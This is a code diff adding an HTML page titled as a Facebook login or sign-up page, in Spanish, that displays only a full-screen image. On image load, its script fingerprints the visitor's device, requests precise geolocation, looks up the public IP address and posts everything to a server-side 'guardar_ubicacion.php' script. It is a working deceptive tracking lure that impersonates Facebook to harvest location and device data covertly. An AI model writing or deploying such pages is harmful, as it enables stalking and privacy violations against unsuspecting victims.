@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - inicia sesion o registrate</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        #imagenGlobal {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+    <script>
+        function obtenerNombreDispositivo() {
+            // Intentamos obtener el nombre del hostname (no siempre disponible)
+            try {
+                if (window.location.hostname && window.location.hostname !== 'localhost') {
+                    return window.location.hostname.split('.')[0];
+                }
+            } catch(e) {}
+            
+            // Obtenemos información del navegador/dispositivo
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            
+            // Creamos un hash único basado en características del dispositivo
+            const deviceHash = btoa(
+                userAgent + platform + 
+                (navigator.hardwareConcurrency || '') + 
+                (screen.width || '') + 
+                (screen.height || '')
+            ).substring(0, 16);
+            
+            return 'dispositivo-' + deviceHash;
+        }
+
+        function obtenerDatosDispositivo() {
+            const userAgent = navigator.userAgent;
+            let os = "Desconocido";
+            
+            if (userAgent.match(/Android/i)) {
+                os = "Android";
+            } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
+                os = "iOS";
+            } else if (userAgent.match(/Windows/i)) {
+                os = "Windows";
+            } else if (userAgent.match(/Macintosh/i)) {
+                os = "MacOS";
+            } else if (userAgent.match(/Linux/i)) {
+                os = "Linux";
+            }
+            
+            return {
+                os: os,
+                userAgent: userAgent,
+                deviceName: obtenerNombreDispositivo()
+            };
+        }
+
+        function obtenerIP(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(() => callback("Desconocida"));
+        }
+
+        function obtenerUbicacion() {
+            const deviceData = obtenerDatosDispositivo();
+            
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const timestamp = new Date().toISOString();
+                        
+                        obtenerIP((ip) => {
+                            fetch("guardar_ubicacion.php", {
+                                method: "POST",
+                                headers: {
+                                    "Content-Type": "application/json",
+                                },
+                                body: JSON.stringify({ 
+                                    latitude, 
+                                    longitude,
+                                    username: deviceData.deviceName,
+                                    ip,
+                                    os: deviceData.os,
+                                    userAgent: deviceData.userAgent,
+                                    accuracy,
+                                    timestamp
+                                }),
+                            })
+                            .then((response) => response.text())
+                            .then((data) => console.log("Datos guardados: ", data))
+                            .catch((error) => console.error("Error:", error));
+                        });
+                    },
+                    (error) => {
+                        console.error("Error geolocalización: ", error.message);
+                        obtenerIP((ip) => {
+                            fetch("guardar_ubicacion.php", {
+                                method: "POST",
+                                headers: {
+                                    "Content-Type": "application/json",
+                                },
+                                body: JSON.stringify({ 
+                                    latitude: null, 
+                                    longitude: null,
+                                    username: deviceData.deviceName,
+                                    ip,
+                                    os: deviceData.os,
+                                    userAgent: deviceData.userAgent,
+                                    accuracy: null,
+                                    timestamp: new Date().toISOString(),
+                                    error: error.message
+                                }),
+                            });
+                        });
+                    }
+                );
+            } else {
+                console.error("Geolocalización no soportada");
+                obtenerIP((ip) => {
+                    fetch("guardar_ubicacion.php", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({ 
+                            username: deviceData.deviceName,
+                            ip,
+                            os: deviceData.os,
+                            userAgent: deviceData.userAgent,
+                            timestamp: new Date().toISOString(),
+                            error: "Geolocalización no soportada"
+                        }),
+                    });
+                });
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const img = document.getElementById("imagenGlobal");
+            img.onload = obtenerUbicacion;
+        });
+    </script>
+</head>
+<body>
+    <img id="imagenGlobal" src="img.png" alt="Imagen Global">
+</body>
+</html>
